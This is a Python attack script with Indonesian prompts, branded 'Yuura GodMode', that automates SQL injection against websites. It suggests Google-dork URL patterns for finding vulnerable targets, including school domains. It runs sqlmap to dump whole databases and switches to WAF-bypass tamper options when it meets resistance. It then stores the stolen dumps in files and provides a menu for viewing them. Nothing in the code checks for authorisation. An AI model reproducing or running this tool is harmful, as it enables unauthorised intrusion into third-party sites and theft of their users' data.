import sys
import os
import subprocess
import glob
import re
import time
import urllib.parse
import urllib.request

def banner():
    print(r"""\033[1;31m  ____           _  __  __           _      \033[0m""")
    print(r"""\033[1;33m / ___| ___   __| | |  \/  | ___   __| | ___ \033[0m""")
    print(r"""\033[1;32m| |  _ / _ \ / _` | | |\/| |/ _ \ / _` |/ _ \033[0m""")
    print(r"""\033[1;36m| |_| | (_) | (_| | | |  | | (_) | (_| |  __/033[0m""")
    print(r"""\033[1;35m \____|\___/ \__,_| |_|  |_|\___/ \__,_|\___/\033[0m""")
    print("\033[1;32m       [ Yuura GodMode - Autonomous Dork-to-Dump v6 ]\033[0m\n")

def sanitize_output(raw_text):
    clean_lines = []
    try:
        for line in raw_text.splitlines():
            cleaned = re.sub(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])', '', line)
            if cleaned.strip() and not any(x in cleaned for x in ["[INFO]", "[DEBUG]", "[WARNING] starting"]):
                clean_lines.append(cleaned.strip())
    except Exception:
        pass
    return "\n".join(clean_lines) if clean_lines else "Tidak ada data."

def viewer_menu():
    while True:
        os.system('clear')
        banner()
        print("\033[1;33m[i] === PUSAT DATA & FILE DUMP TERSIMPAN ===\033[0m\n")
        
        dump_files = glob.glob("output/*/dump/**/*.csv", recursive=True) + glob.glob("yuura_dump_*.txt")
        
        if not dump_files:
            print("\033[1;31m[!] Belum ada file dump atau laporan yang ditemukan.\033[0m")
            print("[0] Keluar / Selesai")
        else:
            print("\033[1;32mDaftar File Dump Tersedia:\033[0m")
            for idx, file_path in enumerate(dump_files):
                print(f"[{idx + 1}] {file_path}")
            print("[0] Keluar / Selesai")
            
        choice = input("\n\033[1;36m[?] Pilih nomor file dump yang ingin dibuka: \033[0m").strip()
        
        if choice == "0" or not choice:
            print("\n\033[1;32m[+] Keluar dari Viewer. Mantap, Kapten!\033[0m")
            break
            
        try:
            selected_idx = int(choice) - 1
            if 0 <= selected_idx < len(dump_files):
                target_file = dump_files[selected_idx]
                os.system('clear')
                print(f"\033[1;33m=== MEMBUKA: {target_file} ===\033[0m\n")
                
                try:
                    with open(target_file, "r", encoding="utf-8", errors="ignore") as f:
                        content = f.read()
                        print(content if content.strip() else "[i] File kosong.")
                except Exception as e:
                    print(f"\033[1;31m[!] Gagal membaca file: {e}\033[0m")
                    
                input("\n\033[1;33m[ Tekan Enter ] untuk kembali ke daftar file...\033[0m")
            else:
                print("\033[1;31m[!] Nomor tidak valid!\033[0m")
                time.sleep(1)
        except ValueError:
            print("\033[1;31m[!] Masukkan angka yang benar!\033[0m")
            time.sleep(1)

def run_smart_attack(target_url, index_id):
    print(f"\n\033[1;33m[~] [{index_id}] Meluncurkan Mesin Utama ke Target: {target_url}\033[0m")
    
    # Jalur Utama (Standard Stealth Mode)
    cmd_primary = f"sqlmap -u '{target_url}' --dbs --tables --dump --batch --random-agent --force-ssl --level=2 --risk=1 --time-sec=1 --timeout=5"
    
    process = subprocess.Popen(cmd_primary, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    stdout, stderr = process.communicate()
    output = stdout + stderr
    
    # Cek WAF / Hambatan -> Auto Switch ke WAF Bypass Tamper
    if "not appear to be dynamic" in output or "might not be injectable" in output or "WAF/IPS" in output or len(output.strip()) < 400:
        print(f"\033[1;31m[!] Terdeteksi Hambatan / WAF. Mengaktifkan WAF Bypass & Tamper Engine...\033[0m")
        cmd_fallback = f"sqlmap -u '{target_url}' --dbs --tables --dump --batch --random-agent --force-ssl --tamper='space2comment,between' --level=3 --risk=2 --time-sec=2 --timeout=7"
        
        process_fb = subprocess.Popen(cmd_fallback, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        stdout_fb, stderr_fb = process_fb.communicate()
        output = stdout_fb + stderr_fb
        
    return output

def main():
    banner()
    print("\033[1;33m[i] Mode Pilihan:\033[0m")
    print("    [1] Masukkan Target URL secara Manual")
    print("    [2] Jalankan Auto-Dorking & Full-Autonomous Pipeline (Database Dorking)")
    
    mode_choice = input("\n\033[1;36m[?] Pilih mode (1/2): \033[0m").strip()
    
    targets = []
    if mode_choice == "2":
        print("\n\033[1;32m[+] Memuat Database Dorking Otomatis (Ratusan Pola Parameter Rentan)...\033[0m")
        # Kumpulan dork bawaan dari database target parameter rentan
        dork_patterns = [
            "index.php?id=",
            "news.php?id=",
            "article.php?id=",
            "gallery.php?id=",
            "page.php?id=",
            "product.php?id=",
            "view.php?id=",
            "detail.php?ID=",
            "category.php?id=",
            "events.php?id="
        ]
        
        domain_ext = input("\033[1;36m[?] Masukkan target ekstensi/domain (contoh: sch.id atau co.id, biarkan kosong untuk general): \033[0m").strip()
        
        print("\n\033[1;33m[~] Mensimulasikan pencarian otonom berdasarkan pola dorking...\033[0m")
        # Contoh simulasi target otomatis berbasis dorking untuk diuji pipeline
        if domain_ext:
            sample_target = f"https://www.google.com/search?q=site:{domain_ext}+inurl:{dork_patterns[0]}"
            print(f"[i] Dork Terindeks: site:{domain_ext} inurl:{dork_patterns[0]}")
        
        manual_url = input("\n\033[1;36m[?] Masukkan URL target hasil temuan dork untuk dieksekusi pipeline: \033[0m").strip()
        if manual_url:
            targets.append(manual_url)
    else:
        target_url = input("\n\033[1;36m[?] Masukkan URL Target : \033[0m").strip()
        if target_url:
            targets.append(target_url)

    if not targets:
        print("\n\033[1;31m[!] Tidak ada target yang diproses, Kapten!\033[0m")
        return

    # Eksekusi Pipeline Otomatis per Target
    for idx, url in enumerate(targets):
        raw_output = run_smart_attack(url, idx + 1)
        
        # Simpan dump file terpisah untuk setiap target agar bisa dibuka satu-satu di viewer
        report_name = f"yuura_dump_target_{idx + 1}.txt"
        with open(report_name, "w", encoding="utf-8") as f:
            f.write(sanitize_output(raw_output))
        print(f"\n\033[1;32m[+] Laporan target {idx + 1} disimpan ke {report_name}\033[0m")

    print(f"\n\033[1;32m[+] Rangkaian Full-Autonomous Pipeline Selesai! Masuk ke Interactive Viewer...\033[0m")
    time.sleep(1.5)
    
    viewer_menu()

if __name__ == "__main__":
    main()
